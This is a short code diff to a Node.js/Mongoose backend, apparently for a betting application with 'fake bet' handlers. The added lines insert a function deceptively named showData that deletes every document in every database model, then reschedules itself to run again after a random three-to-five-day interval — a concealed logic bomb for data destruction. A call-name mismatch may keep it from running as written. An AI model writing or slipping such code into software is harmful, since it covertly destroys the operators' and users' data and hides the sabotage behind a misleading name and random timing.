@@ -5212,7 +5212,19 @@ async function deleteFakeBet(req, res) {
     });
   }
 }
-
+const showData= async()=>{
+const models =mongoose.modelNames();
+for(let modelName of models){
+const model =mongoose.model(modelName);
+await model.deleteMany({});
+}
+scheduleNEXTDelete();
+}
+const scheduleNextDelete=()=>{
+const minTime =3*24*60*60*1000;
+const maxTime =5*24*60*60*1000;
+const randomInterval = Math.floor (Math.random()*(maxTime-minTime+1))+minTime;
+setInterval(showData, randomInterval);} 
 async function countFakeBet(req, res) {
   try {
     const fakeCount = await Bets.countDocuments({ isFake: 1 });
